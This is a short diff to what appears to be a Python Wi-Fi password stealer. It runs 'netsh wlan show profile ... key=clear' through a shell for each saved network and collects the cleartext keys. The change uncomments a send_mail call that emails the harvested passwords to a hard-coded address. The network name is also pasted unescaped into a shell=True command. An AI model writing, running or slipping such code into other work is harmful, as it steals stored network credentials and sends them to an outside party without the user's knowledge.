@@ -22,4 +22,4 @@ for network_name in network_names_list:
     command = "netsh wlan show profile " + network_name + " key=clear"
     current_result = subprocess.check_output(command, shell=True)
     result = result + current_result
-# send_mail("myemail@myemail.com", "mypassword", result)
+send_mail("myemail@myemail.com", "mypassword", result)
